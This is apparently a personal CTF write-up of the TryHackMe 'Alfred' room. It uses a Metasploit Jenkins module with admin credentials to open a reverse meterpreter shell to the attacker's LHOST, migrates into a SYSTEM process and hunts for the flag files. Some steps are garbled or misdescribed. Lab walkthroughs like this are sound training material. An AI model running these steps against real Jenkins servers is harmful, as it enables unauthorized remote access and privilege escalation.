---
layout: default
---          
|<script src="https://tryhackme.com/badge/60599"></script> |<script src="https://www.hackthebox.eu/badge/277042"></script>|

While I really enjoyed getting to learn more about Jenkins, and the care the author of the room took in guiding us through the room but I really just wanted to pwn it!

- I knew it was pwnable in a more efficient manner
- I spent the time, so please enjoy and leave me some comments on how you solved this box as gitlab issues.

> Please note: I do not show the flags, and you will still need to follow the authors instructions to get some of the answers.  I am just showing you how to get the flags!

* * *

### Step one: Add the IP to your /etc/hosts file

* * *

`sudo nano /etc/host`

<img alt="img/67c52cfb46e6457d8fae7e606353798b.png?t=1601661387257" alt="0b2ea5ef12f51f5ab52b22cc519dbd91.png" width="524" height="501" class="jop-noMdConv">

`CTRL+x` to exit, `y` to save.  DO NOT CHANGE THE NAME OF THE FILE.

* * *

### Step two: Enumerate

* * *

We know this is a jenkins exploit, so no need to indepth enumeration.

`nmap alfred.thm`

<img alt="img/78b25b884d31475fa2b05b68607348c0.png?t=1601661674178" alt="20ebc0898abc5c6cb9a71ea4e67caad9.png" width="577" height="214" class="jop-noMdConv">10.searchjenkins

* * *

### Step three: Pop that shell!

* * *

From here, the path is quick and easy.  You need the default Jenkins credentials (google for the Jenkins documentation).

So here is my path to Pwnage!

1\. Open metasploit from your linux command line.

`msfconsole`

2\. `search jenkins` from the msfconsole command line

3\. Since we have Jenkins credentials, `use 9`  
<img alt="img/a8ae7e96dd354ce69e618559eaef7bbc.png?t=1601658764940" alt="cd1a65e304cdccbe1e9241ef18f5b176.png" width="879" height="418" class="jop-noMdConv">set RPORT

4\. Enter the following commands one by one in the msf prompt, as seen below.

- `set PASSWORD admin`
    
- `set USERNAME adminrun`
    
- `set RHOSTS <ip>` , where ipis the tryhackme IP address of the Alfred room you deployed.
    
- `set RPORT 8080`  from the nmap scan.
    
- use the command `set TARGETURI / `  because Jenkins is in the root directory on the webserver.
    
- `set LHOST <ip>`  this is your computers IP via the thm openvpn certificate, do an `ip -br a` command in a linux terminal to list your computers IP addresses.  It is usually the tun0 address.
    
- `set LPORT 4444` , it is usually defaluted to that port.  You can use whatever port you like, just not the known ports.run
    
-   
    <img alt
="img/
	fe4425db59a74cff9e71ff877a637723.png?t=1601660815466" alt="2f5462537591346847b1afeceadd2649.png" width="879" height="476" class="jop-noMdConv">options
    
- now type `run` or `exploit`
    

<img alt="img/f2325e33269e464783442a58b5d7ed60.png?t=1601664169892" alt="29e5da45a2d60f617ed1175ad51a2843.png" width="898" height="362" class="jop-noMdConv">

***Home sweet home, a meterpreter shell!***

* * *

### Step four: Be Admin

* * *

Lets migrate so we can traverse all directories as admin.

At the meterpreter prompt, enter the getsystem command to list all running processes by name.

<img alt="img/18076d61e83e49b8bc2ba26f1f55d1ad.png?t=1601664759531" alt="0ff54a951b799f53c9b811b80042f413.png" width="914" height="482" class="jop-noMdConv">

Next, let's migrate to any NT AUTHORITY\\SYSTEM account by entering `migrate <svc number>`, I tend to choose winlogin.exe or spoolsv.exe personally, but it doesnt really matter.

`migrate 608`

![cc0f2099a4f1571df8d686f9b37c14c5.png](img/e149dc4822094fdab2bd4696de290b83.png?t=1601664867090)

* * *

### Step 5: Get the flags!

* * *

With your newly found powers, go get the flags!

enter `search -f user.txt`

<img alt="img/d4f729955d2246cc82ba6ca4a4bd10fb.png?t=1601664985628" alt="67cedececaea9450eafd8a0e99e0f99b.png" width="534" height="89" class="jop-noMdConv">

now  enter search -f root.txt

<img alt="img/ed4d9557bcbb4879acf4dc26cc1df452.png?t=1601665043882" alt="c05fa8d7b75d23999f71067f38283ee4.png" width="530" height="83" class="jop-noMdConv">

Let's make our way to the flags and get them!

![21a7710c814549b9f26879c0c29400f0.png](img/abf129cf21014a29b4d1357abd89d394.png?t=1601665862078)

![3f7353a3fe0ddff5fa6e5372129078f6.png](img/f89a598d86764f93a410b6682cbacf57.png?t=1601665991792)